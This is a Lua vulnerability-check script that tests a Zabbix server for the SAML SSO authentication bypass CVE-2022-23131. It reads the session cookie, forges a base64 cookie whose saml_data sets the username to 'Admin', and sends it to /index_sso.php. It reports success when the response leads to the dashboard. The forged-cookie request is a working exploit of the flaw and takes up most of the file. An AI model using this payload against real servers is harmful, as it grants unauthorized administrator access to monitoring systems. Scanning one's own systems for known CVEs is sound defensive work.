--[[检查是否存在Zabbix SAML SSO认证绕过漏洞(CVE-2022-23131)]]--
--自行安装依赖库
local socket = require("socket")

local function encodeBase64(source_str)
	local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local s64 = ''
	local str = source_str

	while #str > 0 do
		local bytes_num = 0
		local buf = 0

		for byte_cnt=1,3 do
			buf = (buf * 256)
			if #str > 0 then
				buf = buf + string.byte(str, 1, 1)
				str = string.sub(str, 2)
				bytes_num = bytes_num + 1
			end
		end

		for group_cnt=1,(bytes_num+1) do
			local b64char = math.fmod(math.floor(buf/262144), 64) + 1
			s64 = s64 .. string.sub(b64chars, b64char, b64char)
			buf = buf * 64
		end

		for fill_cnt=1,(3-bytes_num) do
			s64 = s64 .. '='
		end
	end

	return s64
end

local function decodeBase64(str64)
	local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	local temp={}
	for i=1,64 do
		temp[string.sub(b64chars,i,i)] = i
	end
	temp['=']=0
	local str=""
	for i=1,#str64,4 do
		if i>#str64 then
			break
		end
		local data = 0
		local str_count=0
		for j=0,3 do
			local str1=string.sub(str64,i+j,i+j)
			if not temp[str1] then
				return
			end
			if temp[str1] < 1 then
				data = data * 64
			else
				data = data * 64 + temp[str1]-1
				str_count = str_count + 1
			end
		end
		for j=16,0,-8 do
			if str_count > 0 then
				str=str..string.char(math.floor(data/math.pow(2,j)))
				data=math.mod(data,math.pow(2,j))
				str_count = str_count - 1
			end
		end
	end

	local last = tonumber(string.byte(str, string.len(str), string.len(str)))
	if last == 0 then
		str = string.sub(str, 1, string.len(str) - 1)
	end
	return str
end

function decodeURI(s)
	local s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end)
	return s
end

function recv(sock)
	local dataRecv = ""
	local resp, err, part, i
	while true do
		resp, err, part = sock:receive(1)
		if resp ~= nil then
			dataRecv = dataRecv..resp
		else
			break
		end
	end
	return dataRecv
end

function get_session(host, port)
	local c = socket.connect(host, port)
	if c == nil then
		return nil
	end
	c:settimeout(5)
	c:send("GET / HTTP/1.1\r\nHost: "..host..":"..port.."\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0\r\n\r\n")
	local s = recv(c)
	c:close()

	if s ~= nil then
		if string.find(s, 'zbx_session') then
			local _, _, session = string.find(s, 'zbx_session=(%S-);')
			return session
		end
	end

	return nil
end

function check_vul(host, port, session)
	local session_json = decodeBase64(decodeURI(session))
	if session_json ~= nil then
		_, _, sessionid = string.find(session_json, '"sessionid":%s*"(%S-)",')
		_, _, sign = string.find(session_json, '"sign":%s*"(%S-)"')
	else
		return false
	end
	local payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"'..sessionid..'","sign":"'..sign..'"}'
	local cookie = encodeBase64(payload)
	if cookie == nil then
		return false
	end
	local c = socket.connect(host, port)
	if c == nil then
		return false
	end
	c:settimeout(5)
	c:send("GET /index_sso.php HTTP/1.1\r\nHost: "..host..":"..port.."\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0\r\nCookie: zbx_session="..cookie.."\r\n\r\n")
	local s = recv(c)
	c:close()
	if s ~= nil then
		if string.find(s, 'action=dashboard%.view') then
			return true
		end
	end

	return false
end

function check()
	local host = "localhost"
	local port = "80"
	local session = get_session(host, port)
	if session ~= nil then
    		if check_vul(host, port, session) == true then
			print("存在Zabbix SAML SSO认证绕过漏洞")
		end
	end
end

check()
